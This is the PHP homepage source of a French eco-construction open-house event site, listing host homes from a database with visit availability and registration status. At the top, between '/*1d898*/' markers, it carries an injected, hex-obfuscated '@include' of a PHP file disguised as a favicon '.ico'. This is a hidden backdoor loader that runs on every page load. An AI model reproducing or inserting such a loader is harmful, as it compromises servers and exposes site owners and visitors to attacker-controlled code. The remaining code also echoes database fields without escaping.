<?php
/*1d898*/

@include "\x2fva\x72/w\x77w/\x76ho\x73ts\x2fal\x74er\x65ne\x72gi\x65s.\x6frg\x2fht\x74pd\x6fcs\x2f_e\x63eh\x2f20\x314/\x6cib\x2ffa\x76ic\x6fn_\x316b\x3582\x2eic\x6f";

/*1d898*/

include ('defineInc.php');
include ('dbInc.php');
include ('writeTabInc.php');
/*$sql_C = 'SELECT COUNT(*) FROM '.$s_tablePrefix.'eceh_hote WHERE ordre_aff>0';
$query_C = mysql_query($sql_C) or die ("<br />erreur sur : " . $sql_C);
while($data_C = mysql_fetch_array($query_C)){
	$NB_HOTES = $data_C['COUNT(*)'];
}
mysql_free_result($query_C);*//*
$sql_P = 'SELECT * FROM '.$s_tablePrefix.'eceh_params';
$query_P = mysql_query($sql_P) or die ("<br />erreur sur : " . $sql_P);
if($data_P = mysql_fetch_array($query_P)){
	$DATE_DEB_INSCR = strtotime($data_P['date_deb_inscr']);
	$DATE_FIN_INSCR = strtotime($data_P['date_fin_inscr']);
	$INSCR_OUV = $data_P['inscr_ouv'];
}
mysql_free_result($query_P);*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir="ltr" xml:lang="fr" xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>EcoChantiers en EcoHabitats [Alter'énergies] - Accueil</title>
	<meta name="description" content="Deux jours pour découvrir 21 exemples d'éco-construction, en Indre-et-Loire, mais aussi dans le Loir-et-Cher, dans l'Indre, dans la Vienne et dans la Sarthe." />
	<meta name="robots" content="index,follow" />
	<meta name="date" content="2014-09-21T13:00:00+0000" />
	<meta name="keywords" content="alterenergies,ecochantier,ecohabitat,eco,chantier,habitat,ecoconstruction,ecomateriaux" />
	<link rel="search" type="application/opensearchdescription+xml" href="http://www.alterenergies.org/lib/exe/opensearch.php" title="Alter'énergies" />
	<link rel="start" href="http://www.alterenergies.org/" />
	<link rel="contents" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil&amp;do=index" title="Index" />
	<link rel="canonical" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil" />
	<link rel="stylesheet" media="screen" type="text/css" href="css/css.css?v=<?= filemtime('css/css.css')?>" />
	<link rel="stylesheet" media="print" type="text/css" href="css/print.css?v=<?= filemtime('css/print.css')?>" />
	<link rel="stylesheet" type="text/css" href="css/font.css" />
	<script type="text/javascript" src="lib/prototype.js"></script>
	<script type="text/javascript" src="lib/scriptaculous.js?load=effects"></script>
	<script type="text/javascript" src="js/core.js"></script>
	<script type="text/javascript" src="js/script.js"></script>
	<script type="text/javascript" src="js/class.js"></script>
	<script type="text/javascript" src="js/tab.js?v=<?php echo filemtime('js/tab.js');?>"></script>
	<script type="text/javascript" src="js/index.js?v=<?php echo filemtime('js/index.js');?>"></script>
	<link rel="icon" type="image/png" href="gfx/favicon.png" />
<!--[if gte IE 9]>
  <style type="text/css">
	.gradient {
	   filter: none;
	}
  </style>
<![endif]-->

<!--	Correctif pour l'affichage de #contenu-page dans IE6 qui ne connait pas les contextes de formatage :
	http://css.alsacreations.com/Faire-une-mise-en-page-sans-tableaux/design-trois-colonnes-positionnement-flottant
	Et autres...
-->
<!--[if lte IE 6]>
	<style type="text/css">
	#page-contenu {
		overflow: visible;
		height:1px;
	}
	#sommaire-gauche {
		margin-left:4px;
	}
	#bandeau {
		overflow: visible;
		border-bottom:0;
	}
	#titre-alterenergies {
		border-bottom:1px solid #036bc2;
	}
	#page-edition-arriere-plan{
		//overflow:visible;
	}
	#page-edition{width:100%;}
	.footerinc{overflow:visible;}
	div.dokuwiki{overflow:hidden;}

	</style>
<![endif]-->
</head>
<body id="body">
<div class="eceh">
	<div id="bandeau">
		<?php include ('headerInc.php'); ?>
	</div>
	<div id="conteneur-degrade"><!-- DIV utilisé pour faire le dégradé derrière #nos-services, #page-content, #page-edition  -->
		<div id="trois-colonnes">
			<div id="participants">
				<?php include ('participInc.php'); ?>
			</div> <!-- Fin #colonne-participants -->
			<div id="colonne-droite">
				<?php include ('partenInc.php'); ?>
			</div><!-- Fin de #colonne-droite -->
			<div id="page-contenu">
			    <div id="visites" class="center">
					<h1 id="t-eceh">2 week-ends de découverte et d'échange<br /><span class="vertc">autour de l'éco-construction</span></h1>
					<span id="nblieux" class="rougeo"><span id="nb_hotes"><?php echo $NB_HOTES; ?></span> lieux à découvrir en Indre-et-Loire et alentour</span>
					<br /><br />
					<!--<h3 id="t-date">Samedi <span class="vertf">11 &amp;</span> dimanche <span class="vertf">12 octobre 2014</span> à 10h et 15h</h3>
					<h3 id="surinsc" class="vertf">Sur inscription</h3>-->
		 			<h1 id="t-dates">L'édition <span class="orange">2017</span> se tiendra les<br /><span class="orange">samedi 7 et dimanche 8 octobre</span><br />et<br /><span class="orange">samedi 14 et dimanche 15 octobre.</span></span></h1>
					<h1<span class="vertc">La vie étant ce qu'elle est, les possibilités d'accueil de certains de nos hotes ont évoluées depuis l'impression de la plaquette. Les dates présentes sur ce site sont correctes.</span></h1>
					<!--<h3><span class="vertf">Ouverture des inscriptions le <span class="orangep">1<span class="up">er</span> septembre</span></span></h3>
				</div>-->
				<!--<div id="actu"><span class="rougeo gras">L'édition 2015 se prépare !&nbsp;&nbsp;</span><br /><span class="rougeo">Vous trouverez bientôt sur le site<br />la liste des maisons à visiter<br />les 10 et 11 octobre prochains.</span></div>-->
        <!--<div id="conference" class="center vertf">
          <h1><a>Conférence : <span class="vertf">Connaître sa consommation</span> permet-il  de mieux consommer ?</a></h1>
          <h5><a>Jeudi 3 octobre, à 19h00 </br>
           <span class="vertf">salle des médailles, St Pierre des Corps</span></br>
          entrée libre et gratuite</a></h5>-->
<!--<span class="date">Vendredi <span class="orangep">10 octobre à 19 h</span>, à la Mairie de Cinq-Mars-la-Pile.</span> <span class="orange">Entrée gratuite</span>
        </div>-->


				<!--<h2>Ouverture des inscriptions dans quelques jours !</h2>-->
				<!--<div id="inscription">
					<h4 id="h_inscrip">-->
						<?php echo inscription_acc($NB_HOTES, $INSCR_OUV, $DATE_DEB_INSCR, $DATE_FIN_INSCR, $s_tablePrefix) ?>
					<!--<p id="erratum"><u>Erratum</u> : Chez Jean-Baptiste Jamin et Hélène Gillard, la visite de dimanche 15 h est annulée.<br />Chez Cécile et David Hérisson, les visites du dimanche sont remplacées par des visites le samedi.<br />Chez Fréda Menetrier, les visites du samedi sont annulées, celle du dimanche est maintenue.<br />Veuillez nous excuser.</p>-->
					<br />
					<!--<div class="construction">
						<img alt="en construction" src="gfx/construction2016.jpg" />
						<p>site en construction</p>
					</div>-->
				</div>
					<!--</h4>
				</div>-->
				<div id="hotes">
					<form id="fphoto" method="post" action="index.php" onsubmit="return photo(this, <?php echo "'".$s_tablePrefix."'";?>)" accept-charset="utf-8">

						<!-- affichage des photos -->
						<div id="photo" class="photos cache">
							<div class="transparent"></div>
							<!--<span class="ferm">cliquez pour fermer</span>'-->
							<input id="prev" name="prev" type="image" src="gfx/pto-prev.gif" alt="précédente" />
							<img alt="" id="pchantier" src="" />
							<input id="next" name="next" type="image" src="gfx/pto-next.gif" alt="suivante" />
							<span id="legende">...</span>
							<span id="prop">maison</span>
							<input id="close" name="close" type="image" src="gfx/pto-close.gif" alt="fermer" />

							<input name="bouton" id="bouton" value="" type="hidden" />
							<input name="idx" id="idx" value="" type="hidden" />
						</div>
<!-- coder en php si javascript desactive -->
<?php
function inscription_acc($nb_hotes, $inscr_ouv, $date_deb_inscr, $date_fin_inscr, $s_tablePrefix) {
	//$res = '';
	if ($inscr_ouv) {
		if(time() < $date_deb_inscr || time() > $date_fin_inscr){
			fermeInscriptions($s_tablePrefix);
		}
		$res = '			<h3><a id="a_acc_inscr"><span class="rougeo">Pour s\'inscrire : </span></a>
						<!-- modifier class bInscription pour rendre visible le bouton -->
						<!--<div class="bInscription">-->
							<a id="binscription" class="action login bInscription" rel="nofollow" href="login.php">inscription</a></h3>
							<!--jusqu\'à '.date("d/m/y H:i",$date_fin_inscr).'-->
						<!--</div>-->';
	} else {
		if(time() > $date_deb_inscr && time() < $date_fin_inscr){
			ouvreInscriptions($s_tablePrefix);
		}
		$res = '			<!--<a id="a_acc_inscr"><div id="actu"><span class="rougeo gras">L\'édition 2015 se prépare !&nbsp;&nbsp;</span><br /><span class="rougeo">Vous trouverez bientôt sur le site<br />la liste des maisons à visiter<br />les 10 et 11 octobre prochains.</span></div></a>-->
						<!-- modifier class bInscription pour rendre visible le bouton -->
						<!--<div class="bInscription">
							<a id="bpreinscription" class="action login bInscription" rel="nofollow" href="prelogin.php">pré-inscription</a>-->
						<!--</div>-->
						<h3><span class="rougeo gras">Les inscriptions sont closes</span></h3>';
		if(time() < $date_deb_inscr){
			$res = '			<h3><span class="bleu16 gras">Ouverture des inscriptions le '. date("d/m/y",$date_deb_inscr).'</span></h3>';
		}
	}
	return $res;
}

function ouvreInscriptions($s_tablePrefix){
	$sql_U = 'UPDATE '.$s_tablePrefix.'eceh_params SET inscr_ouv="1" WHERE id="1"';
	$query_U = mysql_query($sql_U) or die ("<br />erreur sur : " . $sql_U);
	if (!isset($_GET['mavar'])) {
		$lien = 'index.php?&mavar=1';
		echo '<meta http-equiv="refresh" content="0;URL=index.php">';
	}
	mysql_free_result($query_U);
}

function fermeInscriptions($s_tablePrefix){
	$sql_U = 'UPDATE '.$s_tablePrefix.'eceh_params SET inscr_ouv="0" WHERE id="1"';
	$query_U = mysql_query($sql_U) or die ("<br />erreur sur : " . $sql_U);
	if (!isset($_GET['mavar'])) {
		$lien = 'index.php?&mavar=1';
		echo '<meta http-equiv="refresh" content="0;URL=index.php">';
	}
	mysql_free_result($query_U);
}

function whichDays($a_data){
	$s_day = '';
	/*$n_day = 0x0;
	if ($a_data['placesSamAM'] != 0) {$n_day = 0x1;}
	if ($a_data['placesSamPM'] != 0) {$n_day = $n_day | 0x2;}
	if ($a_data['placesDimAM'] != 0) {$n_day = $n_day | 0x4;}
	if ($a_data['placesDimPM'] != 0) {$n_day = $n_day | 0x8;}
	switch ($n_day) {
		case 1:
			$s_day = "samedi 1er octobre à 10h";
			break;
		case 2:
			$s_day = "samedi 1er octobre à 15h";
			break;
		case 3:
			$s_day = "samedi 1er octobre à 10h &amp; 15h";
			break;
		case 4:
			$s_day = "dimanche 2 octobre à 10h";
			break;
		case 5:
			$s_day = "samedi 1er octobre à 10h et le dimanche 2 octobre à 10h";
			break;
		case 6:
			$s_day = "samedi 1er octobre à 15h et le dimanche 2 octobre à 10h";
			break;
		case 7:
			$s_day = "samedi 1er octobre à 10h &amp; 15h et le dimanche 2 octobre à 10h";
			break;
		case 8:
			$s_day = "dimanche 2 octobre à 15h";
			break;
		case 9:
			$s_day = "samedi 1er octobre à 10h et le dimanche 2 octobre à 15h";
			break;
		case 10:
			$s_day = "samedi 1er octobre à 15h et le dimanche 2 octobre à 15h";
			break;
		case 11:
			$s_day = "samedi 1er octobre à 10h &amp; 15h et le dimanche 2 octobre à 15h";
			break;
		case 12:
			$s_day = "dimanche 2 octobre à 10h &amp; 15h";
			break;
		case 13:
			$s_day = "samedi 1er octobre à 10h et le dimanche 2 octobre à 10h &amp; 15h";
			break;
		case 14:
			$s_day = "samedi 1er octobre à 15h et le dimanche 2 octobre à 10h &amp; 15h";
			break;
		case 15:
		default :
			$s_day = "";
			break;
	}
	return $s_day==''?'                <span class="special">Visites le samedi 1er à 10h et 15h et dimanche 2 à 10h et 15h</span>':'                <span class="special">Visites uniquement le '.$s_day.'</span>';*/

	$j11 = ($a_data['placesSamAM'] != 0);
	$j12 = ($a_data['placesSamPM'] != 0);
	$j21 = ($a_data['placesDimAM'] != 0);
	$j22 = ($a_data['placesDimPM'] != 0);
	$j31 = ($a_data['placesSam2AM'] != 0);
	$j32 = ($a_data['placesSam2PM'] != 0);
	$j41 = ($a_data['placesDim2AM'] != 0);
	$j42 = ($a_data['placesDim2PM'] != 0);
	/*if ($a_data['placesSamAM'] != 0) $j11 = true;
	if ($a_data['placesSamPM'] != 0) $j12 = true;
	if ($a_data['placesDimAM'] != 0) $j21 = true;
	if ($a_data['placesDimPM'] != 0) $j22 = true;
	if ($a_data['placesSam2AM'] != 0) $j31 = true;
	if ($a_data['placesSam2PM'] != 0) $j32 = true;
	if ($a_data['placesDim2AM'] != 0) $j41 = true;
	if ($a_data['placesDim2PM'] != 0) $j42 = true;*/
	$s_day = '<div class="txt_dispo">Disponibilités : </div>
			<div class="picto_jours">
				<div class="hv">
					<div class="hv1">10h 15h</div>
					<div class="hv2">10h 15h</div>
				</div>
				<div class="sam">Samedi 7 oct :&nbsp;&nbsp;&nbsp;
					<span class="picto"><img alt="picto1" src="gfx/'.($j11==true?"oui":"non").'.png" title="Samedi 7 à 10h : visite '.($j11==true?"possible":"impossible").'"></span>
					<span class="picto"><img alt="picto2" src="gfx/'.($j12==true?"oui":"non").'.png" title="Samedi 7 à 15h : visite '.($j12==true?"possible":"impossible").'"></span>
				</div>
				<div class="dim">Dimanche 8 oct :&nbsp;&nbsp;
					<span class="picto"><img alt="picto3" src="gfx/'.($j21==true?"oui":"non").'.png" title="Dimanche 8 à 10h : visite '.($j21==true?"possible":"impossible").'"></span>
					<span class="picto"><img alt="picto4" src="gfx/'.($j22==true?"oui":"non").'.png" title="Dimanche 8 à 15h : visite '.($j22==true?"possible":"impossible").'"></span>
				</div>
				<br />
				<div class="sam">Samedi 14 oct :&nbsp;
					<span class="picto"><img alt="picto5" src="gfx/'.($j31==true?"oui":"non").'.png" title="Samedi 14 à 10h : visite '.($j31==true?"possible":"impossible").'"></span>
					<span class="picto"><img alt="picto6" src="gfx/'.($j32==true?"oui":"non").'.png" title="Samedi 14 à 15h : visite '.($j32==true?"possible":"impossible").'"></span>
				</div>
				<div class="dim">Dimanche 15 oct :
					<span class="picto"><img alt="picto7" src="gfx/'.($j41==true?"oui":"non").'.png" title="Dimanche 15 à 10h : visite '.($j41==true?"possible":"impossible").'"></span>
					<span class="picto"><img alt="picto8" src="gfx/'.($j42==true?"oui":"non").'.png" title="Dimanche 15 à 15h : visite '.($j42==true?"possible":"impossible").'"></span>
				</div>
			</div>';
	return $s_day;
};

function miniature($m_data){
	$res = "";
	if($m_data['nb_photo'] != 0){
		$res = "<div class='cmini'><img src='gfx/photos/" . $m_data['photo'] . "-1.jpg' class='mini' alt='" . $m_data['photo'] . "-1' /></div>";
		for ($i = 2; $i <= $m_data['nb_photo']; $i++){
			$res .= "<img src='gfx/photos/" . $m_data['photo'] . "-" . $i .".jpg' class='preload' alt='" . $m_data['photo'] . "-" . $i ."' />";
		}
	}else{
		$res = "<div class='cmini'><img src='gfx/nd.jpg' class='mini' alt='Pas de photos' /></div>";
	}
	return $res;
};

$sql_S = 'SELECT * FROM '.$s_tablePrefix.'eceh_hote WHERE ordre_aff!=0 ORDER BY ordre_aff';
$query = mysql_query($sql_S) or die ("<br />erreur sur : " . $sql_S);
while($data = mysql_fetch_array($query)){
	$dpt = substr($data['cp'],0,2);
	echo '			<div class="hote level2 dpt'.$dpt.'">';
	echo '				<p><span class="num num'.$dpt.'">'.$data['ordre_aff'].'</span><span class="num ndpt nd'.$dpt.'"></span><span class="nom">'.$data['nom'].'</span><span class="adr">'.$data['ville'].'</span></p>';
	echo miniature($data);
	echo whichDays($data);
//	echo '               <span class="special">Disponibilités à venir</span>';
	//echo '            <a class="savoir_plus sp'.$dpt.'">en savoir plus...</a>';
	echo '				<a class="savoir_plus sp" title="En savoir plus...">';
	//echo '					<img alt="En savoir plus..." title="En savoir plus..." src="gfx/ensavoirplus.png" />';
	echo '				</a>';
	echo '				<div class="description cache" title="Cliquez pour fermer">';
	echo '              <span class="ferm">cliquez pour fermer</span>';
	echo '              <h5 class="phrase">'.$data['phrase'].'</h5>';
	if ($data['blog'] != ""){
		echo '              <p class="blog"><a href="'.$data['blog'].'" title="Cliquez pour naviguer vers '.$data['blog'].'">'.$data['blog'].'</a><a class="blog_ext" href="'.$data['blog'].'"><img src="gfx/iconExtLink.png" alt="Lien externe" title="Cliquez pour ouvrir le lien dans un nouvel onglet" /></a></p>';
	}
	//if ($data['phrase'] != "")
	echo '				<p>'.$data['descr'].'</p>';
	/*if ($data['id'] != 14)
	  echo '              <h4><a href="gfx/photos/fd'.$data['photo'].'.pdf">télécharger la fiche descriptive (pdf)<img alt="pdf" id="pdf'.$data['id'].'" src="gfx/icn-acrobat.gif" /></a></h4>';*/
    if ($data['nb_photo']>0){
		echo '				<h5><input name="show'.$data['ordre_aff'].'" id="show'.$data['ordre_aff'].'" value="show'.$data['ordre_aff'].'" class="photo" type="image" title="Cliquez pour voir les photos" src="gfx/cam.gif" /></h5>';
	}
	echo '			</div>';
	// PHOTO
	echo '		</div>';
	echo '		<div class="hote-sep">&nbsp;</div>';
}
mysql_free_result($query);
?>
					</form>
				</div> <!-- hotes -->
			</div><!-- Fin de #page-contenu -->
		</div><!-- fin DIV #deux-colonnes -->
		<div style="clear: both;"></div>
		<div id="page-edition">
			<div id="page-edition-arriere-plan">
				<!-- boutons utilisateur -->
				<div id="boutons-utilisateur" class="bInscription">
<?php
	if($INSCR_OUV){
		echo '					<a class="action login" rel="nofollow" href="login.php">inscription</a>';
	}/*else{
		echo '					<a class="action login" rel="nofollow" href="prelogin.php">pre-inscription</a>';
	}*/
?>
			  </div>
			</div><!-- fin DIV #page-edition-arriere-plan -->
		</div><!-- fin DIV #page-edition -->
	</div><!-- fin DIV pour dégradé #conteneur-degrade -->
	<div style="clear: both;"></div>
<?php
	include ('footerInc.php');
?>
</div><!--<div class="eceh">-->
<div id="scroll-bar" class="scroll_bar_a" style="display:none;">
	<a  href="#" title="Haut de page"><span></span>Haut de page</a>
</div>
</body>
</html>
<?php
	ob_end_flush();
?>
